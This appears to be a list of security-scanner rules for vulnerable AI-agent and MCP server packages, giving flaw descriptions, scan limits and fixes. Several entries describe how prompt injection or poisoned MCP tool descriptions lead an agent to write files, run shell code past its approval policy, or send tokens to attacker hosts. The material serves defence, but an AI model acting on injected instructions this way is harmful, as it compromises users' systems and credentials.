rules.description: Better Auth before 1.6.13 ships a cluster of OAuth flaws reachable through the `mcp` and legacy `oidcProvider` plugins (and `@better-auth/oauth-provider` from 1.6.0): the `refresh_token` grant authenticates only possession of the refreshToken row + matching `client_id` and never verifies the confidential client's `client_secret`, letting an attacker with a refresh token mint access/refresh tokens (CVE-2026-53512); the `authorization_code` grant redeems a single-use code via a non-atomic find-then-delete, so two concurrent requests both mint tokens (code replay, CVE-2026-53518); insecure cryptographic defaults advertise the `none` algorithm and accept plain PKCE by default (CVE-2026-67336, fixed 1.6.11); and registered `redirect_uris` are not scheme-validated, so a `javascript:` redirect URI executes in the authorization-server origin → session theft / account takeover (CVE-2026-67333, fixed 1.6.13). Treat < 1.6.13 (and unpinned) as exposed.
rules.limitations: Reads `better-auth` and `@better-auth/oauth-provider` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`) or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `better-auth` / `@better-auth/oauth-provider` to >= 1.6.13 and pin it. Verify `client_secret` on confidential-client refresh grants, redeem authorization codes atomically (single-use, delete-on-read under a lock), reject non-http(s) `redirect_uri` schemes, and disable the `none` algorithm / plain PKCE in the OIDC/MCP provider config.
rules.title: Better Auth OAuth/MCP plugin flaw cluster — token bypass, code replay, weak crypto, open redirect (< 1.6.13)

rules.description: browse-mcp, a Playwright-based headless-browser MCP server, before 0.8.2 has `browser_download` write a fetched response body to `join(save_dir, filename)` without validating the caller-supplied `save_dir`, while `browser_save_state` and `browser_load_state` honour a caller-supplied path unchanged (CVE-2026-55557). An MCP client -- or an autonomous agent steered by indirect prompt injection, which is the realistic path -- writes outside the intended directory. Fixed in 0.8.2. The pinned artifact is the **npm** package (`That1Drifter/browse-mcp`); PyPI carries an unrelated `browse-mcp` (an academic-paper search server) whose 0.1.x line never approaches this floor.

The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.

For a comparable download tool, resolve the destination and require it to stay under a fixed root (`os.path.realpath` / `Path.resolve()` then a containment check) rather than filtering the path string -- and treat the filename as untrusted too.

rules.description: A tool entry in a SEP-1649 server card (`/.well-known/mcp/server-card.json`) carries a `description` containing a tool-poisoning / imperative-injection payload — invisible Unicode, a prompt-injection directive, a cross-tool reference, or an encoded (base64/hex) blob. Because a client fetches and trusts the card *before* connecting, the injected instructions enter the model context ahead of any tool call. Detection reuses the AAK-POISON-001..006 detectors.
rules.limitations: Reads `tools[].description` in a committed card with the phrase lists of AAK-POISON-001..004, so the same wording gaps apply. Text in a tool's `title`, or in the parameter descriptions of its `inputSchema`, is not read.
rules.remediation: Treat a server card's tool descriptions as untrusted content: strip invisible Unicode, reject imperative/injection phrasing and encoded payloads, and render descriptions as data (never as instructions). Pin the card to a signed, provenance-verified publisher.
rules.title: Poisoned tool description in an MCP server card

rules.description: A SEP-1649 server card's declared `transport` disagrees with its advertised capabilities: a remote transport (`http`/`sse`/`streamable-http`/`ws`, or a routable `endpoint` URL) while `authentication.required` is `false` (an anyone-can-connect network endpoint), or a `stdio`/local transport that nonetheless advertises a remote `endpoint`. A client that provisions based on the card's advertised shape connects to a transport it did not expect.
rules.limitations: Reports a remote transport only when `authentication.required` is the JSON boolean `false`. A remote transport with no `authentication` block at all, or with `"required": "false"` as a string, is not reported, and the endpoint is read from the `transport` object only: a top-level `url` is ignored. A URL that Node, requests and Rust's `url` crate read differently from curl, httpx and urlsplit, which keep a backslash inside the authority, is judged by the less safe of the two readings.
rules.remediation: Make the card's `transport` and `authentication` consistent: require an inbound credential on every remote transport, and do not advertise a remote `endpoint` on a `stdio`/local card. Regenerate the card from the server's real runtime configuration.
rules.title: MCP server card transport / advertised-capability mismatch

rules.description: A SEP-1649 server card carries no `signature` / `provenance` / `attestation` / `publisher` field, or one that is empty / a placeholder. The card's self-declared tool list, transport, and endpoint are then trusted with no proof of origin — a MITM or a typosquatting host can serve a forged card at the well-known path and the client will provision against it.
rules.limitations: Checks that a `signature`, `signatures`, `provenance`, `attestation`, `publisher` or `verified` field exists and is not empty or a placeholder (`todo`, `unsigned`, `xxx` and the like). It never verifies a signature, so `"signature": "not-a-real-signature"` or `"verified": true` satisfies it.
rules.remediation: Sign the server card (detached signature or an `attestation` block) and have clients verify it against a pinned publisher key before provisioning. Populate `publisher` / `provenance` with a verifiable identity — never a placeholder.
rules.title: MCP server card missing or invalid signature / provenance

rules.description: A SEP-1649 server card asserts over-broad capabilities: a wildcard auth scope (`*` / `all`), a `capabilities` object with everything enabled and no constraint, or `authentication.required: true` paired with an empty `schemes` list (no enforceable method). Over-broad claims invite clients to grant more trust / scope than the server needs, widening blast radius on compromise.
rules.limitations: Treats a scope as a wildcard only when it is exactly `*`, `all`, `any`, `full`, `admin`, `root` or `*:*`, so `mcp:*` or `tools:*` passes. A capability counts as asserted only when its value is the boolean `true`: a card that lists `tools`, `resources`, `prompts` and `logging` as objects is not reported.
rules.remediation: Declare only the capabilities and scopes the server actually exposes; replace wildcard scopes with an explicit list, and pair `authentication.required: true` with at least one concrete scheme. Least-privilege the card.
rules.title: Over-broad capability claims in an MCP server card

rules.description: Claude Code Templates (`claude-code-templates`), a CLI for configuring and monitoring Claude Code, before 1.29.4 launches the Claude Code Studio server (`cli-tool/src/sandbox-server.js`) via the `--studio` option bound to all interfaces on port 3444, with cross-origin requests permitted and no authentication. `POST /api/execute` passes the request-body `prompt` field to `executeLocalTask()` and `POST /api/install-agent` passes the `agentName` field to a child process; the same unsafe agent path is reachable from `/api/execute` through `checkAndInstallAgent()`. These attacker-controlled values reach `child_process.spawn()` with shell execution enabled, so shell metacharacters are interpreted as OS commands — arbitrary command execution with the developer's privileges. An attacker who can reach the port directly, or who lures a developer running Studio to a malicious website, compromises source code, credentials, and local data (CVE-2026-73222, CVSS 8.8). Fixed in 1.29.4 (the version before it is 1.29.2; no 1.29.3 was published, so treat < 1.29.4 and unpinned as exposed).
rules.limitations: Reads `claude-code-templates` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `claude-code-templates` to >= 1.29.4 and pin it. Do not run `--studio` on an untrusted network; bind the Studio server to loopback, require authentication, and reject cross-origin requests. Never pass request-body fields (`prompt`, `agentName`) into a shell.
rules.title: claude-code-templates < 1.29.4 (--studio server: unauth 0.0.0.0:3444 → command-injection RCE)

rules.description: `@aborruso/ckan-mcp-server`, an MCP server for querying CKAN open-data portals, before 0.4.112 carries three related defects. `canonicalizeParams` in `src/utils/cache.ts` serialises request parameters without escaping `&`, `=` or `|`, so distinct logical parameter sets collapse to the same `buildCacheKey` output and an attacker can prime the shared cache with a response another user's different query then receives (CVE-2026-73846, CVSS 6.5). `isValidMqaServer`, used by `ckan_get_mqa_quality` and `ckan_get_mqa_quality_details` in `src/tools/quality.ts`, validates the `server_url` parameter with a prefix-only regular expression for `dati.gov.it`, which suffix-host and URL-userinfo forms defeat, letting a caller point the tool at an attacker-controlled host and receive a spoofed response (CVE-2026-73845, CVSS 5.3). Error paths reflect raw upstream response bodies and internal exception text — hostnames, internal IPs, database errors, stack fragments — back to the caller instead of a sanitised message (CVE-2026-73844, CVSS 3.7). All three are fixed in 0.4.112.

A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@aborruso/ckan-mcp-server` to >= 0.4.112 and pin it. The three share a root cause worth fixing in any MCP server: build cache keys from a structured, escaped encoding rather than string concatenation; validate a caller-supplied host by parsing the URL and comparing the resolved host exactly, never by prefix-matching the raw string; and return a generic error to the caller while logging the detail server-side.
rules.title: @aborruso/ckan-mcp-server < 0.4.112 (cache-key collision, prefix-only host check, verbose errors)

rules.description: The Claude Agent SDK (`claude-agent-sdk` on PyPI, `@anthropic-ai/claude-agent-sdk` on npm) runs Claude Code by starting the Claude CLI with arguments built from its options. Below 0.2.121 the Python SDK passed the `resume` option as two tokens, `--resume` and the session id. The CLI declares `--resume` with an optional value, so a session id that starts with `-` is not taken as its value but parsed as a flag of its own. An application that resumes a session id it takes from untrusted input, such as a chat endpoint that resumes the session its client names, lets that client pass `--mcp-config` defining a stdio MCP server, whose command the CLI runs at startup, outside the SDK's permission controls (CVE-2026-96620, CVSS 4.0 9.2, CWE-20/CWE-78/CWE-88, GHSA-h4mw-j7qp-8mwm). 0.2.121 passes `--resume=<id>`, which the CLI rejects when the id names no session (347a1cb, anthropics/claude-agent-sdk-python#1123). The CVE record names the Python SDK; its fix commit says the TypeScript SDK shipped the same fix in 0.3.208. Checked in the published packages: Python 0.0.23, the first release, to 0.2.120 and TypeScript 0.0.4 to 0.3.207 build the two tokens, and Python 0.2.121 and TypeScript 0.3.208 bind the value. CRITICAL is the advisory's own rating; NVD has not scored the record itself.
rules.limitations: Reads `claude-agent-sdk` below 0.2.121 in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile and the Pipfile.lock, poetry.lock and uv.lock lockfiles, and `@anthropic-ai/claude-agent-sdk` below 0.3.208 in the root package.json and its package-lock.json, pnpm-lock.yaml and yarn.lock. A range that admits an affected version is reported. A reference must state a version to be reported: an unpinned one installs the newest release, which is fixed. It reads versions, not code, so an application that never passes untrusted input to `resume` is reported too. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`). `claude-code-sdk`, the Python SDK's name before it became `claude-agent-sdk`, builds the same two tokens at 0.0.25, its last release, but no advisory names it, and it is not read. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `claude-agent-sdk` to 0.2.121 or later, or `@anthropic-ai/claude-agent-sdk` to 0.3.208 or later, and pin it. Until then, pass `resume` only a session id your application got from the SDK and stored itself, never one a client sends, and reject any value that starts with `-`. Keep untrusted input out of `extra_args` (`extraArgs` in TypeScript) as well: it hands flags to the CLI by design, and the Python SDK binds a value starting with `-` there only from 0.2.124.
rules.title: Claude Agent SDK below 0.2.121 (TypeScript below 0.3.208): a session id passed to `resume` can inject Claude CLI flags that run a command

rules.description: Claude Code (`@anthropic-ai/claude-code`, npm) applies an organization's server-managed settings: permission deny rules, model restrictions and managed-only locks. From 2.0.68 (Claude for Enterprise; from 2.1.38 for Team) until 2.1.260 it fetched those settings with an API key stored by Claude Code, from an earlier `/login` or written to its configuration, ahead of the session's valid Enterprise or Team sign-in. When the settings endpoint rejected that key, the session started without the organization's policy, or kept applying a stale cached copy, while still operating as the organization's account (CVE-2026-103012, CVSS 4.0 2.0, CWE-696, GHSA-gfvf-j8jh-jxxw). Triggering it needed local access to a device holding such a key. Endpoint-managed (MDM or file-based) settings were not affected, and auto-update has delivered the fix.
rules.limitations: Reports `@anthropic-ai/claude-code` from 2.0.68 up to 2.1.260 where a project states its version: a package.json or lockfile entry, or a versioned `npx` reference in an MCP config. An unpinned reference is not reported, as for the folder-trust pin on the same package: it resolves to the newest release, and the CLI updates itself. A global install, the usual one, is in no file AAK reads. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@anthropic-ai/claude-code` to 2.1.260 or later and pin it, or leave auto-update on. Remove stored API keys from machines that sign in with an Enterprise or Team account.
rules.title: Claude Code 2.0.68 to 2.1.259 fetched managed settings with a stored API key ahead of the Enterprise or Team sign-in

rules.description: The Cline (`cline`) Hub dashboard server before 3.0.30 accepts WebSocket connections on `/browser` without validating the Origin header, and when `ROOM_SECRET` is unset on a local 127.0.0.1 bind, `isAuthorizedBrowserRequest()` lets an attacker-controlled website send `desktopCommand` frames that read workspace state, mutate MCP and provider settings, and trigger command execution once a provider/model is configured (CVE-2026-59723, CVSS 8.8). Fixed in 3.0.30.
rules.limitations: Reads `cline` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`) or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `cline` to >= 3.0.30 and pin it. Do not run the Hub dashboard on an untrusted network; set `ROOM_SECRET` and require Origin validation on the dashboard WebSocket.
rules.title: Cline < 3.0.30 (Hub dashboard WebSocket origin bypass → RCE)

rules.description: Cloud Run MCP (`@google-cloud/cloud-run-mcp`, GoogleCloudPlatform/cloud-run-mcp) deploys local source to Cloud Run by uploading an archive to a Cloud Storage bucket named `<project id>-source-bucket` and building from it. Before 1.11.0 it used an existing bucket of that name without checking which project owns it. Bucket names are global, so a bucket created first under that name in another project, and left open to writes, receives the source: its owner can read it, or change it before Cloud Build runs it (CVE-2026-85297, CVSS 4.0 7.7, CWE-340). 1.11.0 checks that the bucket belongs to the deploying project and otherwise uses a randomized name (GoogleCloudPlatform/cloud-run-mcp#300).
rules.limitations: Reports an npm reference to `@google-cloud/cloud-run-mcp` below 1.11.0 that states a version: a package.json or lockfile entry, or the package in an MCP config, reporting a range that admits an affected version. `latest` was 1.11.0 on 2026-10-27 and states no version, so the README's own unversioned `npx -y @google-cloud/cloud-run-mcp` is not reported. The unscoped npm `cloud-run-mcp` is the same 1.0.0 build under the project's first name, and that is its only release, so any reference to it is reported, an unversioned one included; that takes in an MCP server run by the bare name `cloud-run-mcp`, which is also the executable a global install of the scoped package provides. It reads the version, not whether the server ever deploys from source, nor which bucket a past deploy used. Docker's MCP catalog image `mcp/cloud-run-mcp` is tagged only `latest`, the remote-server image `us-docker.pkg.dev/cloudrun/container/mcp` carries no version tag, and the Gemini CLI extension installs from the repository, so none states a version AAK reads and none is reported. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@google-cloud/cloud-run-mcp` to 1.11.0 or later and pin it, in place of the unscoped `cloud-run-mcp`, whose only release is 1.0.0. If an earlier release has deployed source, check that `<project id>-source-bucket` belongs to your project, and redeploy from a known-good tree if it does not.
rules.title: Cloud Run MCP below 1.11.0: source deploys use a bucket named after the project without checking who owns it

rules.description: CodeWhale between 0.8.41 and 0.8.64 ships two tools whose `approval_requirement()` returns `ApprovalRequirement::Auto`, which the engine treats as "never prompt". That silently overrides the user's configured `--approval-policy` for the two tool classes it should never be overridden for. `rlm_eval` runs model-supplied Python in a `python3` interpreter with no prompt and no audit step (CVE-2026-75858, CVSS 7.8, CWE-94); `exec_shell_interact` (alias `exec_interact`) writes LLM-controlled stdin into an already-approved long-running interactive session — a `python3 -i` REPL, `mysql`, `ssh`, or `sudo -i` — so commands run at that process's privilege level (CVE-2026-75857, CVSS 7.0). Neither needs a malicious operator: prompt injection in any untrusted content the agent reads (a fetched page, a repository file, an MCP tool result) reaches both, and the companion `rlm_open` tool can stage exactly that content. Both are fixed in 0.8.64. `deepseek-tui` is the same project before it was renamed and is carried by both advisories; it is deprecated on npm in favour of `codewhale`, so it has no fixed release of its own.
rules.limitations: Reads `codewhale` and `deepseek-tui`, each against its own fix floor, in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`) or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). Cargo manifests are not read, so the crates.io crate `codewhale-tui`, which has the same defect, is not reported. A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `codewhale` to >= 0.8.64 and pin it. If the manifest still names `deepseek-tui`, that package is deprecated and its line ends before the fix: migrate to `codewhale` >= 0.8.64 rather than upgrading in place. Until then, treat any approval policy you have configured as not in force for `rlm_eval` or `exec_shell_interact` and remove those tools from the exposed tool set, since a policy the engine never consults offers no protection.
rules.title: CodeWhale auto-approved code execution: rlm_eval and exec_shell_interact bypass the approval policy (`codewhale` >= 0.8.41, < 0.8.64)

rules.description: Conductor OSS, the workflow orchestration server, has AI workers that include an MCP client. Its `LIST_MCP_TOOLS` task passes the workflow's `mcpServer` input to `MCPService.listTools`, which connects to that URL with no check on where it points, so whoever can define or run a workflow can make the server request internal hosts or a cloud metadata endpoint and read the answer (CVE-2026-109402, CVSS 3.1 6.3, CWE-918). Checked in the source: MCPService arrives in 3.22.0 and has no destination check on `main`, and the image `conductoross/conductor` bundles the AI module. The AI workers run only when `conductor.integrations.ai.enabled` is true, which the published image's configuration does not set. There is no fixed release, and upstream closed SSRF guards for the HTTP task as an enterprise feature.
rules.limitations: Reads `conductoross/conductor` references from 3.22.0 up to and including 4.0.0-alpha.1, the newest tag, and `latest`, pushed on 2026-10-14, in compose files, Kubernetes manifests, Helm values, Dockerfiles and MCP configs. It reads the tag, not the configuration, so a server with the AI workers off, the image's default, is reported too. 3.22.0-rc1, which predates the task, also reads as 3.22.0 and is reported. The README's `:next` tag states no version and is not read, and neither is the `orkesio/orkes-conductor-community` image or a locally built `conductor:server`.
rules.remediation: There is no fixed release. Leave `conductor.integrations.ai.enabled` off unless you use the AI workers, let only trusted users define and run workflows, and block the server's egress to internal ranges and metadata addresses.
rules.title: Conductor image from 3.22.0: the LIST_MCP_TOOLS task connects to any mcpServer URL (SSRF, no fixed release)

rules.description: An `mcpServers` entry declares a field whose type does not match the MCP client schema -- most often `args` as a scalar instead of a list of strings. Clients disagree about what to do with it: some coerce, some ignore the field, some refuse to start the server. A config that one client launches and another silently drops is a security fact, not a cosmetic one, because the reviewed configuration and the running configuration stop being the same thing. AAK's own composition pass crashed on `"args": 42` (issue #743), which is how this was found: the scan reported a clean project because the scanner that would have objected died before it could.
rules.limitations: Checks the JSON type of `args`, `command`, `env` and `url` on each entry of an `mcpServers` object, or of the `servers` object in VS Code's `.vscode/mcp.json`. A config whose `mcpServers` is an array, a server entry that is a bare string, and a wrong-typed `headersHelper` are skipped without a finding.
rules.remediation: Give the field the type the MCP schema defines: `args` must be a list of strings (`["--port", "8080"]`, not `8080`). Validate agent configs in CI so a client-specific coercion never decides what runs.
rules.title: MCP server entry has a field of the wrong type

rules.description: Contentful's MCP server exposes `host`, `proxy`, `rawProxy` and `insecure` as tool arguments on `export_space` and `import_space` (`packages/mcp-tools/src/tools/jobs/space-to-space-migration/`), and combines them with the server's own `CONTENTFUL_MANAGEMENT_TOKEN`. Once `space_to_space_migration_handler` has enabled the migration tools, a direct MCP call — or prompt injection through Contentful content an attacker can write — redirects Management API requests, and the `Authorization` header riding on them, to a host or proxy of the attacker's choosing. The disclosed token is a personal access token, so it grants out-of-band access to every space in its scope until it is rotated; upgrading does not undo that. Tools built through `createToolClient` pin the host from server configuration and are unaffected, which is what makes this a property of the two migration tools rather than of the server (CVE-2026-53957, CVSS 7.7, CWE-918). Fixed in `@contentful/mcp-server` 1.7.19 and `@contentful/mcp-tools` 0.4.5 — two packages on two version lines, so this rule carries a pin for each.
rules.limitations: Reads `@contentful/mcp-server` and `@contentful/mcp-tools`, each against its own fix floor, in package.json, .mcp.json, mcp.json, claude_desktop_config.json and the package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles at the project root only, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`packages/app/package.json`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (a Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `@contentful/mcp-server` to >= 1.7.19 and `@contentful/mcp-tools` to >= 0.4.5, and pin both. **Rotate the Contentful management token** if an affected version ever ran with the migration tools enabled: the upgrade closes the redirect, it does not retract a token already sent elsewhere. Where you build similar tools, take the API host from server configuration and never from a tool argument — a destination an LLM can choose is a destination an attacker can choose.
rules.title: @contentful/mcp-server < 1.7.19 / @contentful/mcp-tools < 0.4.5 (LLM-controlled host and proxy carry the management token)

rules.description: IBM ContextForge MCP Gateway (`mcp-contextforge-gateway` on PyPI, and the `ghcr.io/ibm/mcp-context-forge` image) at or below 1.0.8 carries disclosed defects that one floor remediates. CVE-2026-77822 (HIGH 8.2): the A2A invocation endpoint `POST /a2a/{agent_name}/invoke` does not pin the DNS-resolved IP at connection time — unlike every other egress path in the gateway — so an authenticated low-privileged user reaches internal addresses by DNS rebinding and receives the full response body. CVE-2026-18905 (HIGH 7.7): the same rebinding class during tool invocation, at or below 1.0.6. CVE-2026-18486 (HIGH 8.8): jq filters are validated improperly, letting a remote authenticated attacker read credentials and escalate, at or below 1.0.7. CVE-2026-18489 (HIGH 7.4): the Translate utility exposes data elements to the wrong session, leaking across sessions, at or below 1.0.8. CVE-2026-78573 (CRITICAL 9.8): 1.0.0 through 1.0.7 ship default credentials, so a remote attacker gains administrative access outright — the floor already in place covers it, and it is recorded here rather than as a second rule because one upgrade remediates all of them. CVE-2026-53709 (CRITICAL 9.8): below 1.0.2 the default `JWT_SECRET_KEY` is a published string (`my-test-key` in 0.1.0, a longer variant by 1.0.1), and while `REQUIRE_USER_IN_DB` is false, its default before 1.0.2, a token whose subject is the platform administrator's email is accepted as that administrator with no database account, so a remote attacker can mint admin tokens. CVE-2026-53711 (MEDIUM, CVSS 4.0 5.1): before 0.3.1 the Admin UI writes a saved Global Prompts template into the page as HTML, a stored XSS against whoever views it. Both are fixed below this floor. CVE-2026-8355 (MEDIUM, CVSS 3.1 6.4 from IBM): through 1.0.5, a user allowed to create gateways registers one with OAuth client credentials and a `token_url` of their choosing, and the gateway posts its client credentials there and returns up to 256 characters of a reply that is not a token in its 502, so the user reaches internal services and cloud metadata. 1.0.1 began checking `token_url`, but token requests still followed redirects; 1.0.6 stops following them and checks `redirect_uri` and `jwks_uri` too, below this floor as well. Treat < 1.0.9 (and unpinned) as exposed.
rules.limitations: Reads `mcp-contextforge-gateway` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth. It also reads `ghcr.io/ibm/mcp-context-forge` tags below 1.0.9 in compose files, Kubernetes manifests, Helm values, Dockerfiles and MCP configs. `latest` was the v1.0.11 digest on 2026-10-20, fixed, so an untagged or `latest` reference, which the README and the chart default to, is not reported.
rules.remediation: Upgrade `mcp-contextforge-gateway` to >= 1.0.9 and pin it, or run the `ghcr.io/ibm/mcp-context-forge` image at v1.0.9 or later. Change any credential that shipped as a default before doing anything else, `JWT_SECRET_KEY` included: generate a new one (from 1.0.2, `python -m mcpgateway.scripts.init_secrets`), because a token signed with the old key stays valid while that key is configured, and in development mode 1.0.2 and later accept a known key with only a warning. Where the gateway makes outbound requests on behalf of a caller, resolve the destination once and connect to the pinned IP rather than re-resolving the hostname after the allow-list check.
rules.title: IBM ContextForge MCP Gateway: default credentials and JWT key, DNS-rebind and OAuth token-URL SSRF, jq-filter, Admin UI XSS and cross-session leaks (<= 1.0.8)

rules.description: Cortex (`neuro-cortex-memory`), a cross-platform persistent-memory MCP server, at 3.17.0 and below treats the `CLAUDE_PROJECT_DIR` environment variable — which Claude Code sets automatically to whatever project is currently open — as a candidate Cortex developer checkout. When the `open_visualization` tool runs, `_find_dev_source()` resolves that directory as a source root and `_is_cortex_root()` validates it by looking for nothing more than an `mcp_server/` subdirectory and a `ui/unified-viz.html` file. An attacker who ships those two marker paths in a repository gets `mcp_server/server/visualize_bootstrap.py` from that repository executed via `subprocess.run([sys.executable, ...])`, with the victim's privileges, simply because the victim opened the repo (CVE-2026-49986, HIGH). Note the fix version: the NVD text says 3.17.1, but GHSA-gvpp-v77h-5w8g records the affected range as <= 3.17.0 with **3.18.0** first patched, and no 3.17.1 was ever published to PyPI — so 3.18.0 is the floor. The distribution was later renamed to `hypermnesia-mcp`, whose earliest release is 3.24.0 and therefore always above this floor.
rules.limitations: Reads `neuro-cortex-memory` in requirements*.txt at any depth and, at the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the lowest version a range allows and reporting a reference that states no version. The dependency is not read when it is declared in a sub-directory manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or `.vscode/mcp.json`, or in a lockfile format the reader does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read. A declaration nested more than 64 levels deep in package.json, a TOML manifest or an MCP config (an MCP server more than 62) is still judged, and reported without a line; a lockfile entry keeps its line at any depth.
rules.remediation: Upgrade `neuro-cortex-memory` to >= 3.18.0 and pin it, or move to its successor `hypermnesia-mcp` (>= 3.24.0, above the affected line). Never derive a trusted code root from an environment variable the editor points at untrusted content; marker-file presence is not authentication.
rules.title: neuro-cortex-memory <= 3.17.0 (CLAUDE_PROJECT_DIR treated as a trusted source root)

rules.description: `d365fo-mcp` (npm; dynamics365ninja/d365fo-mcp-server), an MCP server that answers questions about Dynamics 365 Finance & Operations X++ code and metadata, ships an HTTP mode for Azure App Service. Before 1.11.0 its documented one-click deployment, infrastructure/azuredeploy.json and main.bicep, defaulted the `apiKey` parameter to an empty string and passed it to the App Service's `API_KEY` setting; with `API_KEY` empty, `src/middleware/apiKeyAuth.ts` passed every request through, and `src/index.ts` bound the listener to `0.0.0.0` by default. A deployer who left the optional key blank and added no network restriction or upstream authentication got a public App Service that answered unauthenticated JSON-RPC `tools/call` requests on `/mcp` (CVE-2026-114123, CVSS 3.1 7.5, CWE-306/CWE-1188, GHSA-8764-fh3m-wf7g). `MCP_SERVER_MODE=read-only` did not help: `search`, `get_object_info`, `batch_get_info`, `extension_info`, `security_info`, `find_references` and `find_event_handlers` returned the indexed proprietary X++ source snippets, business logic, extension and event-handler wiring, security-role and privilege structure and labels from PackagesLocalDirectory. 1.11.0 (e70bd051, 384394a8) makes the template's `apiKey` required, defaults a keyless server to loopback, and refuses to start an HTTP listener on a non-loopback address without `API_KEY` unless `ALLOW_UNAUTHENTICATED=true` states that something upstream authenticates.
